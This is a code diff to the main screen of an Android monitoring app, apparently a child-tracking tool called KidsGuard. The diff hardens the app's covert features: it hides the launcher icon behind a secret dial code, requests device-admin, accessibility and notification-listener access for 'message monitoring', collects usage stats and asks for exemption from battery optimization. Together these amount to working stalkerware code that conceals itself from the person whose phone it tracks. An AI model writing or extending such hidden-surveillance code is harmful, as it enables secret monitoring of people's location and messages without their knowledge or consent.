@@ -6,18 +6,27 @@ import android.content.ComponentName;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.ActivityInfo;
+import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
 import android.view.View;
 import android.widget.Button;
+import android.widget.TextView;
 import android.widget.Toast;
+
+import java.util.ArrayList;
+import java.util.List;
 
 public class MainActivity extends Activity {
 
+    private static final int REQ_CRITICAL = 101;
+
     SharedPreferences prefs;
-    android.widget.TextView tvDeviceId;
+    TextView tvDeviceId;
     Button btnStartService;
     Button btnStopService;
     Button btnHideApp;
@@ -43,7 +52,12 @@ public class MainActivity extends Activity {
         btnNotifAccess = findViewById(R.id.btnNotifAccess);
 
         String deviceId = LocationService.getSafeDeviceId(this);
-        tvDeviceId.setText("Device Code: " + deviceId);
+        if (deviceId == null || deviceId.isEmpty()) {
+            tvDeviceId.setText("Device code unavailable");
+            btnStartService.setEnabled(false);
+        } else {
+            tvDeviceId.setText("Device Code: " + deviceId);
+        }
 
         btnStartService.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -77,7 +91,7 @@ public class MainActivity extends Activity {
         btnAccessibility.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+                openSafely(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
             }
         });
 
@@ -87,29 +101,37 @@ public class MainActivity extends Activity {
                 Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                 intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                         new ComponentName(MainActivity.this, AdminReceiver.class));
-                startActivity(intent);
+                openSafely(intent);
             }
         });
 
         btnNotifAccess.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
-                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
+                openSafely(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
             }
         });
 
-        // Auto-start service
+        // Auto-start service safely
         startChildService();
     }
 
     private void startChildService() {
-        Intent i = new Intent(this, LocationService.class);
-        if (Build.VERSION.SDK_INT >= 26) {
-            startForegroundService(i);
-        } else {
-            startService(i);
+        if (LocationService.isRunning()) {
+            Toast.makeText(this, "Service already running", Toast.LENGTH_SHORT).show();
+            return;
         }
-        Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
+        try {
+            Intent i = new Intent(this, LocationService.class);
+            if (Build.VERSION.SDK_INT >= 26) {
+                startForegroundService(i);
+            } else {
+                startService(i);
+            }
+            Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
+        } catch (Exception e) {
+            Toast.makeText(this, "Start failed: " + e.getClass().getSimpleName(), Toast.LENGTH_LONG).show();
+        }
     }
 
     private void showHideDialog() {
@@ -132,6 +154,22 @@ public class MainActivity extends Activity {
             PackageManager pm = getPackageManager();
             ComponentName cn = new ComponentName(
                     this, "com.kidsguard.child.MainActivityLauncher");
+
+            PackageInfo info = pm.getPackageInfo(getPackageName(), PackageManager.GET_ACTIVITIES);
+            boolean present = false;
+            if (info.activities != null) {
+                for (ActivityInfo ai : info.activities) {
+                    if (cn.getClassName().equals(ai.name)) {
+                        present = true;
+                        break;
+                    }
+                }
+            }
+            if (!present) {
+                Toast.makeText(this, "Launcher alias missing — hide aborted", Toast.LENGTH_LONG).show();
+                return;
+            }
+
             pm.setComponentEnabledSetting(
                     cn,
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
@@ -141,21 +179,30 @@ public class MainActivity extends Activity {
                     "App hidden. Dial *#*#12345#*#* to reopen.",
                     Toast.LENGTH_LONG).show();
 
-            // Go home
             Intent home = new Intent(Intent.ACTION_MAIN);
             home.addCategory(Intent.CATEGORY_HOME);
             home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(home);
 
         } catch (Exception e) {
-            Toast.makeText(this, "Hide failed: " + e.getMessage(),
+            Toast.makeText(this, "Hide failed: " + e.getClass().getSimpleName(),
                     Toast.LENGTH_LONG).show();
+        }
+    }
+
+    private void openSafely(Intent i) {
+        try {
+            startActivity(i);
+        } catch (android.content.ActivityNotFoundException e) {
+            Toast.makeText(this, "Open Settings manually to continue", Toast.LENGTH_LONG).show();
+        } catch (Exception e) {
+            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show();
         }
     }
 
     private void requestAllPermissions() {
         if (Build.VERSION.SDK_INT >= 23) {
-            java.util.List<String> neededList = new java.util.ArrayList<>();
+            List<String> neededList = new ArrayList<>();
             String[] allPerms = {
                     android.Manifest.permission.ACCESS_FINE_LOCATION,
                     android.Manifest.permission.ACCESS_COARSE_LOCATION,
@@ -191,28 +238,75 @@ public class MainActivity extends Activity {
             }
 
             if (!neededList.isEmpty()) {
-                requestPermissions(neededList.toArray(new String[0]), 101);
+                requestPermissions(neededList.toArray(new String[0]), REQ_CRITICAL);
             } else {
-                Toast.makeText(this, "Standard runtime permissions already granted", Toast.LENGTH_SHORT).show();
+                checkSpecialPermissions();
+            }
+        } else {
+            checkSpecialPermissions();
+        }
+    }
+
+    private void checkSpecialPermissions() {
+        if (!hasUsageStatsPermission()) {
+            Toast.makeText(this, "Usage Access is required for screen time tracking", Toast.LENGTH_LONG).show();
+            openSafely(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
+            return;
+        }
+        if (!isNotificationListenerEnabled()) {
+            Toast.makeText(this, "Notification Access is required for message monitoring", Toast.LENGTH_LONG).show();
+            openSafely(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
+            return;
+        }
+
+        if (Build.VERSION.SDK_INT >= 23) {
+            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+            intent.setData(Uri.parse("package:" + getPackageName()));
+            openSafely(intent);
+        }
+        Toast.makeText(this, "All permissions verified", Toast.LENGTH_SHORT).show();
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode != REQ_CRITICAL) return;
+
+        List<String> denied = new ArrayList<>();
+        for (int i = 0; i < grantResults.length; i++) {
+            if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
+                denied.add(permissions[i]);
             }
         }
 
-        // Usage stats permission
-        if (!hasUsageStatsPermission()) {
-            Toast.makeText(this, "Please enable Usage Access permission", Toast.LENGTH_LONG).show();
-            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
-        } else if (!isNotificationListenerEnabled()) {
-            Toast.makeText(this, "Please enable Notification Access permission", Toast.LENGTH_LONG).show();
-            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
-        } else {
-            Toast.makeText(this, "Checking special access permissions...", Toast.LENGTH_SHORT).show();
+        if (denied.isEmpty()) {
+            checkSpecialPermissions();
+            return;
         }
 
-        // Battery optimization
-        if (Build.VERSION.SDK_INT >= 23) {
-            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
-            try { startActivity(intent); } catch (Exception ignored) {}
+        boolean permanent = true;
+        for (String p : denied) {
+            if (shouldShowRequestPermissionRationale(p)) {
+                permanent = false;
+                break;
+            }
+        }
+
+        if (permanent) {
+            new AlertDialog.Builder(this)
+                    .setTitle("Permission required")
+                    .setMessage("Permissions are denied permanently. Please enable them in app settings.")
+                    .setPositiveButton("OPEN SETTINGS", new DialogInterface.OnClickListener() {
+                        @Override
+                        public void onClick(DialogInterface d, int w) {
+                            openSafely(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
+                                    Uri.parse("package:" + getPackageName())));
+                        }
+                    })
+                    .setNegativeButton("CANCEL", null)
+                    .show();
+        } else {
+            Toast.makeText(this, "Denied permissions: " + denied.size(), Toast.LENGTH_LONG).show();
         }
     }
 
@@ -224,7 +318,7 @@ public class MainActivity extends Activity {
 
     private boolean hasUsageStatsPermission() {
         android.app.AppOpsManager appOps = (android.app.AppOpsManager) getSystemService(APP_OPS_SERVICE);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT && appOps != null) {
             int mode = appOps.checkOpNoThrow(
                     android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                     android.os.Process.myUid(),
